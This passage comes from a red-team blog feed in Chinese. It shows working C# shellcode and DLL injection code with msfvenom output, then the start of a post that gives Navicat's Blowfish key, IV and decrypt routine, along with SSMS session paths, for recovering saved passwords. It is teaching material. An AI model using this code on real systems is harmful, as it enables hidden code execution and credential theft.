无法将shellcode注入进程id &#123;pid&#125; 的内存中.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        bool hOpenProcessClose = CloseHandle(pHandle);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(&quot;[+] &quot; + Marshal.GetExceptionCode());</span><br><span class="line">        Console.WriteLine(ex.Message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Cobalt Strike</code> 提供了两种在远程进程中分配内存并将数据复制到其中的选项，而其中默认使用项就是使用了 <strong>VirtualAllocEx</strong> -&gt; <strong>WriteProcessMemory</strong> 的经典模式，这模式也是红队工具中最常见的模式。此模式也适用于不同的进程体系结构。</p><p>当然，一个好的实现需要考虑到出现不同的极端情况，比如 x86 -&gt; x64， x64 -&gt; x86，不同上下文等，不过这不是本文的内容。</p><h2 id="0x03-深入了解函数"><a href="#0x03-深入了解函数" class="headerlink" title="0x03 深入了解函数"></a>0x03 深入了解函数</h2><h3 id="3-1-访问远程进程"><a href="#3-1-访问远程进程" class="headerlink" title="3.1 访问远程进程"></a>3.1 访问远程进程</h3><p>要对任何进程执行内存操作，我们必须能够访问到它。可以通过使用 <code>OpenProcess</code> 函数获得，该函数原型是：</p><p><img src="/image/【知识回顾】进程注入-第一部分/blog_2019-09-02_15-56-38.png" alt=""></p><p>它需要 3 个参数：</p><ul><li><p><strong>DwDesiredAccess：</strong>对进程对象的请求访问权限。它将根据受害者进程的安全描述符进行检查。如果调用者启用了 <code>SeDebugPrivilege</code> 特权，则无论安全描述符的内容如何，都会授予所请求的访问权限。</p></li><li><p><strong>bInheritHandle：</strong>如果此值为 TRUE，则此进程创建的进程将继承该句柄。否则，进程不会继承此句柄。</p></li><li><strong>dwProcessId：</strong>这是受害者进程的进程标识符。</li></ul><p>如果函数成功，则返回值是指定进程的打开句柄，其他 API函数可以使用它来操作受害进程的内存。失败时，返回 NULL。</p><h3 id="3-2-为-shellcode-分配空间"><a href="#3-2-为-shellcode-分配空间" class="headerlink" title="3.2 为 shellcode 分配空间"></a>3.2 为 shellcode 分配空间</h3><p>一旦我们获得进程的句柄，我们继续为内存中的 shellcode 分配空间。这是通过使用 <code>VirtualAllocEx</code> API 调用完成的。</p><p><img src="/image/【知识回顾】进程注入-第一部分/blog_2019-09-02_16-10-46.png" alt=""></p><p>它需要 5 个参数：</p><ul><li><strong>hProcess：</strong>进程的句柄。该函数在此进程的虚拟地址空间内分配内存。句柄必须具有<strong>PROCESS_VM_OPERATION</strong>访问权限。</li><li><strong>lpAddress：</strong>指向受害者进程内存中指定地址的指针。如果参数指定为 NULL，则该函数回自动选择要分配的内存页面。</li><li><strong>dwSize：</strong>要分配的内存区域的大小，它以字节为单位。</li><li><strong>flAllocationType：</strong>指定要分配的内存类型。此参数必须包含以下值之一。：MEM_COMMIT、MEM_RESERVE、MEM_RESET、MEM_RESET_UNDO。</li><li><strong>flProtect：</strong>要分配的页面区域的内存保护。出于我们的目的，它将包含我们要执行的代码，并且我们希望它可读可写，我们将其设置为 PAGE_EXECUTE_READWRITE。</li></ul><p>该函数在成功时返回分配的基址，而失败时，返回 NULL。</p><p>此时我们已经成功设法在进程中分配可执行内存。</p><h3 id="3-3-在远程进程中写入-shellcode"><a href="#3-3-在远程进程中写入-shellcode" class="headerlink" title="3.3 在远程进程中写入 shellcode"></a>3.3 在远程进程中写入 shellcode</h3><p>现在，我们需要在分配的区域中写入 shellcode。为此，我们有一个名为 <code>WriteProcessMemory</code> 的函数。</p><p><code>WriteProcessMemory</code> 是一个函数，它将调用者的数据写入指定进程的内存区域。需要注意的时整个内存区域必须时可写的，否则函数会失败，这就是为什么我们要将内存分配为可写，并与可读和可执行文件一起分配。</p><p><img src="/image/【知识回顾】进程注入-第一部分/blog_2019-09-02_16-33-57.png" alt=""></p><p>它需要 5 个参数。</p><ul><li><strong>hProcess：</strong>要修改的进程内存的句柄。句柄必须具有 PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION 访问权限。</li><li><strong>lpBaseAddress：</strong>指向写入数据的指定进程中的基址的指针（我们想要写入数据的地址）。在发生数据传输之前，系统会验证指定大小的基址和内存中的所有数据是否都可以进行写访问，如果无法访问，则该函数将失败。</li><li><strong>lpBuffer：</strong>指向缓冲区的指针，指针补习时const指针。该缓冲区包含要在指定进程的地址空间中写入的数据。</li><li><strong>nSize：</strong>要写入指定进程的字节数。</li><li><strong>lpNumberOfBytesWritten：</strong>指向变量的指针，该变量接收传输到指定进程的字节数。此参数是可选的。如果 <em>lpNumberOfBytesWritten</em> 为 <strong>NULL</strong>，则忽略该参数。</li></ul><p>如果函数由于某些原因而失败，则返回 false，如果成功则返回 true。</p><p>此时，stage 已全部设置，所需的只是在远程进程中创建一个线程并运行它。</p><h3 id="3-4-执行-shellcode"><a href="#3-4-执行-shellcode" class="headerlink" title="3.4 执行 shellcode"></a>3.4 执行 shellcode</h3><p>为了在远程进程中创建线程，我们使用 Win32 API 提供的 <code>CreateRemoteThread</code> 函数。</p><p><img src="/image/【知识回顾】进程注入-第一部分/blog_2019-09-02_17-10-28.png" alt=""></p><p>它需要 7 个参数，其中只有 3 个是我们感兴趣的。其余的可以通过调整它们获得默认值，可以对新创建的线程进行更多控制。</p><p>我们感兴趣的参数是：</p><ul><li><strong>hProcess：</strong>要创建线程的进程的句柄。</li><li><strong>lpStartAddress：</strong>它是指向 <em>THREADSTARTROUTINE</em> 的指针，THREADSTARTROUTINE 是线程创建后开始执行代码的位置。</li><li><strong>lpParameter：</strong>指向 <em>LPTHREAD_START_ROUTINE</em> 所需参数的指针。因为在这种情况下，它是一个普通的shellcode，它不期望任何参数，因此，我们将它保持为 NULL 。此参数在 DLL 注入中具有价值。</li></ul><h2 id="0x04-演示"><a href="#0x04-演示" class="headerlink" title="0x04 演示"></a>0x04 演示</h2><p>利用 msfvenom 生成 shellcode</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rcoil@MacBookPro  ~  msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f hex</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">Found 3 compatible encoders</span><br><span class="line">Attempting to encode payload <span class="keyword">with</span> <span class="number">1</span> iterations <span class="keyword">of</span> generic/<span class="keyword">none</span></span><br><span class="line">generic/<span class="keyword">none</span> <span class="keyword">failed</span> <span class="keyword">with</span> <span class="keyword">Encoding</span> <span class="keyword">failed</span> due <span class="keyword">to</span> a bad <span class="built_in">character</span> (<span class="keyword">index</span>=<span class="number">7</span>, <span class="built_in">char</span>=<span class="number">0x00</span>)</span><br><span class="line">Attempting <span class="keyword">to</span> <span class="keyword">encode</span> payload <span class="keyword">with</span> <span class="number">1</span> iterations <span class="keyword">of</span> x64/<span class="keyword">xor</span></span><br><span class="line">x64/<span class="keyword">xor</span> succeeded <span class="keyword">with</span> <span class="keyword">size</span> <span class="number">311</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x64/<span class="keyword">xor</span> chosen <span class="keyword">with</span> <span class="keyword">final</span> <span class="keyword">size</span> <span class="number">311</span></span><br><span class="line">Payload <span class="keyword">size</span>: <span class="number">311</span> <span class="keyword">bytes</span></span><br><span class="line"><span class="keyword">Final</span> <span class="keyword">size</span> <span class="keyword">of</span> <span class="keyword">hex</span> <span class="keyword">file</span>: <span class="number">622</span> <span class="keyword">bytes</span></span><br><span class="line"><span class="number">4831</span>c94881e9deffffff488d05efffffff48bbc690bbfdf6dbd2a448315827482df8ffffffe2f43ad83819063312a4c690faacb78b80f590d88a2f939359f6a6d830afee9359f6e6d8308fa693dd138cdaf6cc3f93e3646aacda81f4f7f2e50759b6bcf71a304994d1eab57d89f22f84acf3fc2650522cc690bbb5731ba6c38e916bad7d93cae04dd09bb4f70b31f28e6f72bc7def5aecc746f6cc3f93e3646ad17a34fb9ad365fe70ce0cbad89e80ced5822c83038ae04dd09fb4f70bb4e54d9cf3b97d9bceedc740fa76f2539aa516d1e3bcae858bfe87c8faa4b7819a272ab0faaf093b8ae59fcaf376e432855b396fe6b54cdad2a4c690bbfdf6935f29c791bbfdb761e32fa91744284d3bcf8eccd1015b63664f5b13d83839dee7d4d8cc10401d83de69e3d5e2d497f682932d1c6f6e9e97b7b1a4</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/image/【知识回顾】进程注入-第一部分/blog_2019-09-02_18-02-31.png" alt=""></p><h2 id="0x05-DLL-注入"><a href="#0x05-DLL-注入" class="headerlink" title="0x05 DLL 注入"></a>0x05 DLL 注入</h2><h3 id="5-1-什么是DLL？"><a href="#5-1-什么是DLL？" class="headerlink" title="5.1 什么是DLL？"></a>5.1 什么是DLL？</h3><p>动态链接库（DLL）是一个包含代码的文件，程序已加载该文件以在运行时执行一个或多个操作。</p><h3 id="5-2-什么是DLL注入？"><a href="#5-2-什么是DLL注入？" class="headerlink" title="5.2 什么是DLL注入？"></a>5.2 什么是DLL注入？</h3><p>DLL 注入是一个将 DLL 注入到正在运行中的进程的过程，该进程可能包含恶意代码，可用于执行恶意活动。</p><h3 id="5-3-相关函数"><a href="#5-3-相关函数" class="headerlink" title="5.3 相关函数"></a>5.3 相关函数</h3><ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea" target="_blank" rel="noopener">GetModuleHandleA</a> ：检索已由调用进程加载的指定模块的模块句柄。</li><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress" target="_blank" rel="noopener">GetProcAddress</a> ：从指定的动态链接库（DLL）中检索导出的函数或变量的地址。</li></ul><h3 id="5-4-示例代码"><a href="#5-4-示例代码" class="headerlink" title="5.4 示例代码"></a>5.4 示例代码</h3><p>DLL 注入，只需要在上面的基础上引入 <code>LoadLibrary</code> 即可。</p><p>代码部分只需要修改以下内容即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public static void DLLInject(int pid, byte[] buf)</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        uint lpNumberOfBytesWritten = 0;</span><br><span class="line">        uint lpThreadId = 0;</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 获取进程ID &#123;pid&#125; 的句柄.&quot;);</span><br><span class="line">        IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 打开进程id &#123; pid &#125; 的句柄 &#123;pHandle&#125;.&quot;);</span><br><span class="line">        IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] LoadLibraryA 的导出函数地址是 &#123;loadLibraryAddr&#125; .&quot;);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 分配 DLL 路径的内存.&quot;);</span><br><span class="line">        IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 注入 DLL 路径的内存分配在 0x&#123;rMemAddress&#125;.&quot;);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 在已分配的内存位置写入 DLL 路径.&quot;);</span><br><span class="line">        if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine($&quot;  [&gt;] DLL 路径写在目标进程内存中.&quot;);</span><br><span class="line">            Console.WriteLine($&quot;  [&gt;] 创建远程线程来注入 DLL.&quot;);</span><br><span class="line">            IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, loadLibraryAddr, rMemAddress, 0, ref lpThreadId);</span><br><span class="line">            bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);</span><br><span class="line">            Console.WriteLine($&quot;[&gt;] 成功将 DLL 注入进程id &#123;pid&#125; 的内存中.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine($&quot;  [!] 无法将 DLL 注入进程id &#123;pid&#125; 的内存中.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        bool hOpenProcessClose = CloseHandle(pHandle);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(&quot;[+] &quot; + Marshal.GetExceptionCode());</span><br><span class="line">        Console.WriteLine(ex.Message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-来源参考"><a href="#0x06-来源参考" class="headerlink" title="0x06 来源参考"></a>0x06 来源参考</h2><p><a href="https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.html" target="_blank" rel="noopener">https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.html</a></p><p><a href="https://pwnrip.com/demystifying-code-injection-techniques-part-1-shellcode-injection/" target="_blank" rel="noopener">https://pwnrip.com/demystifying-code-injection-techniques-part-1-shellcode-injection/</a></p><p><a href="https://blog.cobaltstrike.com/2019/08/21/cobalt-strikes-process-injection-the-details/" target="_blank" rel="noopener">https://blog.cobaltstrike.com/2019/08/21/cobalt-strikes-process-injection-the-details/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;通过 &lt;code&gt;CreateRemoteThread&lt;/code&gt; API 进行代码与 DLL 注入。&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="知识回顾" scheme="https://rcoil.me/tags/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    
  </entry>
  
  <entry>
    <title>【编程】SharpDecryptPwd</title>
    <link href="https://rcoil.me/2019/09/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/"/>
    <id>https://rcoil.me/2019/09/【编程】SharpDecryptPwd/</id>
    <published>2019-09-01T06:37:56.000Z</published>
    <updated>2019-11-01T02:28:14.624Z</updated>
    
    <content type="html"><![CDATA[<p>这是一篇对密码已保存在 Windwos 系统上的部分程序进行解析。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在 <code>Windows</code> 系统下保存密码，无非就只存在于两个位置：<strong><em>注册表</em></strong>、<strong><em>文件</em></strong>。所以下文主要也是从注册表项、session文件中获取相关加密后的密码字段。且文章中所涉及的知识点，出处全在文末来源参考中，本文仅仅是个人的理解及整合。</p><p>主要对以下几个程序进行解析</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、Navicat PremiumSoft</span><br><span class="line">2、SQL<span class="built_in"> Server </span>Management Studio</span><br><span class="line">3、Xmanager --&gt; Xshell,Xftp</span><br><span class="line">4、TeamView</span><br><span class="line">5、FileZille</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span></span><br></pre></td></tr></table></figure><p><strong>PS:</strong> 可以使用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" rel="noopener">Process Monitor </a> 监测进程的操作。</p><h2 id="0x01-Navicat-PremiumSoft"><a href="#0x01-Navicat-PremiumSoft" class="headerlink" title="0x01 Navicat PremiumSoft"></a>0x01 Navicat PremiumSoft</h2><p>​        <code>Navicat</code> 的 session 信息是保存在注册表中的。以 <code>MySql</code> 为例</p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-23_16-34-53.png" alt=""></p><p><center> Navicat 中的 MySQL 配置（注册表路径）</center><br>​        上图注册表中，保存着我们需要的<strong><em>Host</em></strong>、<strong><em>UserName</em></strong>、<strong><em>PassWord</em></strong>等字段。以下是数据库类型对应注册表路径表</p><table><tr><th width="20%" bgcolor="#eea236">数据库类型</th><th width="80%" style="text-align:center" bgcolor="rgb(92," 184,="" 92)="">注册表路径</th></tr><tr><td> MySQL </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers</td></tr><tr><td> MariaDB </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers</td></tr><tr><td> MongoDB </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers</td></tr><tr><td> Microsoft SQL </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers</td></tr><tr><td> Oracle </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers</td></tr><tr><td> PostgreSQL </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers</td></tr><tr><td> SQLite </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers</td></tr></table><h3 id="1-1-如何加密"><a href="#1-1-如何加密" class="headerlink" title="1.1 如何加密"></a>1.1 如何加密</h3><p>Navicat 使用 <code>Blowfish算法（河豚密码）</code>加密密码字符串。以下是 Navicat 所做的事情：</p><ul><li>生成密钥</li></ul><ol><li>Navicat使用SHA-1算法生成160位密钥；</li><li>对 <code>3DC5CA39</code> 字符串取其 <code>SHA-1摘要</code>，长度为8个字节，这字符串是 <code>Blowfish算法</code>中使用的密钥；</li><li>确切的值是：<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] Key = &#123;</span><br><span class="line"><span class="number">0x42</span>, <span class="number">0xCE</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>, <span class="number">0xA5</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0xB7</span>, <span class="number">0x4A</span>, <span class="number">0xEA</span>, <span class="number">0x93</span>, <span class="number">0x94</span>,</span><br><span class="line"><span class="number">0x79</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x43</span>, <span class="number">0x91</span>, <span class="number">0x87</span>, <span class="number">0x33</span>, <span class="number">0x40</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><ul><li>初始化向量（IV）</li></ul><ol><li>因为 <code>Blowfish算法</code>每次只能加密一个<strong>8字节长的块</strong>；</li><li>所以开始时，Navicat 用 <code>0xFF</code> 填充一个<strong>8字节长的块</strong>，然后利用上面提到的 Key 进行 Blowfish 加密，得到 8字节长的初始向量（IV）；</li><li>确切的值是：<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] IV = &#123;</span><br><span class="line"><span class="number">0xD9</span>, <span class="number">0xC7</span>, <span class="number">0xC3</span>, <span class="number">0xC8</span>, <span class="number">0x87</span>, <span class="number">0x0D</span>, <span class="number">0x64</span>, <span class="number">0xBD</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><ul><li>加密 rawPass 字符串</li></ul><ol><li><strong>rawPass</strong> 字符串是ASCII字符串，且不考虑 “NULL” 终止符。</li><li>Navicat 使用管道来加密 <strong>rawPass</strong> 字符串。管道如下所示：</li></ol><p><img src="/image/【编程】SharpDecryptPwd/EncryptionPipeline.png" alt=""></p><p><center>Blowfish 加密</center><br><strong><em>注意：</em></strong>每个明文块都是一个8字节长的块。只有当最后一个明文块不是8字节长时，才能执行上图中显示的最后一步。</p><h3 id="1-2-加密过程（C-）"><a href="#1-2-加密过程（C-）" class="headerlink" title="1.2 加密过程（C#）"></a>1.2 加密过程（C#）</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">string</span> <span class="title">EncryptString</span>(<span class="params"><span class="keyword">string</span> plaintext</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] plaintext_bytes = Encoding.UTF8.GetBytes(plaintext);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] CV = Enumerable.Repeat&lt;<span class="keyword">byte</span>&gt;(<span class="number">0xFF</span>, Blowfish.BlockSize).ToArray();</span><br><span class="line">            blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">string</span> ret = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">int</span> blocks_len = plaintext_bytes.Length / Blowfish.BlockSize;</span><br><span class="line">            <span class="keyword">int</span> left_len = plaintext_bytes.Length % Blowfish.BlockSize;</span><br><span class="line">            <span class="keyword">byte</span>[] temp = <span class="keyword">new</span> <span class="keyword">byte</span>[Blowfish.BlockSize];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; blocks_len; ++i) &#123;</span><br><span class="line">                Array.Copy(plaintext_bytes, Blowfish.BlockSize * i, temp, <span class="number">0</span>, Blowfish.BlockSize);</span><br><span class="line">                XorBytes(temp, CV, Blowfish.BlockSize);</span><br><span class="line">                blowfishCipher.Encrypt(temp, Blowfish.Endian.Big);</span><br><span class="line">                XorBytes(CV, temp, Blowfish.BlockSize);</span><br><span class="line"></span><br><span class="line">                ret += ByteArrayToString(temp);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (left_len != <span class="number">0</span>) &#123;</span><br><span class="line">                blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);</span><br><span class="line">                XorBytes(CV,</span><br><span class="line">                         plaintext_bytes.Skip(blocks_len * Blowfish.BlockSize).Take(left_len).ToArray(),</span><br><span class="line">                         left_len);</span><br><span class="line">                ret += ByteArrayToString(CV.Take(left_len).ToArray());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-3-解密过程"><a href="#1-3-解密过程" class="headerlink" title="1.3 解密过程"></a>1.3 解密过程</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">string</span> <span class="title">DecryptString</span>(<span class="params"><span class="keyword">string</span> ciphertext</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] ciphertext_bytes = StringToByteArray(ciphertext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] CV = Enumerable.Repeat&lt;<span class="keyword">byte</span>&gt;(<span class="number">0xFF</span>, Blowfish.BlockSize).ToArray();</span><br><span class="line">    blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] ret = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> blocks_len = ciphertext_bytes.Length / Blowfish.BlockSize;</span><br><span class="line">    <span class="keyword">int</span> left_len = ciphertext_bytes.Length % Blowfish.BlockSize;</span><br><span class="line">    <span class="keyword">byte</span>[] temp = <span class="keyword">new</span> <span class="keyword">byte</span>[Blowfish.BlockSize];</span><br><span class="line">    <span class="keyword">byte</span>[] temp2 = <span class="keyword">new</span> <span class="keyword">byte</span>[Blowfish.BlockSize];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; blocks_len; ++i) &#123;</span><br><span class="line">        Array.Copy(ciphertext_bytes, Blowfish.BlockSize * i, temp, <span class="number">0</span>, Blowfish.BlockSize);</span><br><span class="line">        Array.Copy(temp, temp2, Blowfish.BlockSize);</span><br><span class="line">        blowfishCipher.Decrypt(temp, Blowfish.Endian.Big);</span><br><span class="line">        XorBytes(temp, CV, Blowfish.BlockSize);</span><br><span class="line">        ret = ret.Concat(temp).ToArray();</span><br><span class="line">        XorBytes(CV, temp2, Blowfish.BlockSize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (left_len != <span class="number">0</span>) &#123;</span><br><span class="line">        Array.Clear(temp, <span class="number">0</span>, temp.Length);</span><br><span class="line">        Array.Copy(ciphertext_bytes, Blowfish.BlockSize * blocks_len, temp, <span class="number">0</span>, left_len);</span><br><span class="line">        blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);</span><br><span class="line">        XorBytes(temp, CV, Blowfish.BlockSize);</span><br><span class="line">        ret = ret.Concat(temp.Take(left_len).ToArray()).ToArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Encoding.UTF8.GetString(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>效果如下：</strong></p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-27_12-48-37.png" alt=""></p><p><center> Navicat PremiumSoft 解密结果</center></p><h2 id="0x02-SSMS"><a href="#0x02-SSMS" class="headerlink" title="0x02 SSMS"></a>0x02 SSMS</h2><p>​以 <code>session</code> 文件名及位置来划分，SSMS 可以分为 3 个大版本。（保存的文件都是标准的.net二进制序列化文件）</p><table><tr><th width="20%" bgcolor="#eea236">Version </th><th width="80%" style="text-align:center" bgcolor="rgb(92," 184,="" 92)="">Session File Path</th></tr><tr><td> SSMS 2005 </td><td> %appdata%\Microsoft\Microsoft SQL Server\90\Tools\Shell\mru.dat</td></tr><tr><td> SSMS 2008 </td><td> %appdata%\Microsoft\Microsoft SQL Server\100\Tools\Shell\SqlStudio.bin</td></tr><tr><td> SSMS Other </td><td> %appdata%\Microsoft\SQL Server Management Studio\xxxx\SqlStudio.bin</td></tr></table><p>这章节，所要表达的内容在 <a href="http://www.zcgonvh.com/post/SQL_Server_Management_Studio_saved_password_dumper.html" target="_blank" rel="noopener">SQL Server Management Studio密码导出工具</a> 当中已经分析得很详细了，故不多写。</p><p><strong><em>PS：</em></strong>因为要加载私有程序集，故此程序无法在 <code>Cobalt Strike</code> 中使用，原因未知。</p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-23_15-51-03.png" alt=""></p><p><center> SharpSSMSPwd 解密结果</center></p><h2 id="0x03-Xmanager"><a href="#0x03-Xmanager" class="headerlink" title="0x03 Xmanager"></a>0x03 Xmanager</h2><p>​        有人问 session 文件里保存的密码是以什么方式保存的，被盗了后果是否很严重？<br>官方给出了下面的答案</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-What <span class="keyword">is</span> the obfuscation algorithm?</span><br><span class="line"></span><br><span class="line">It <span 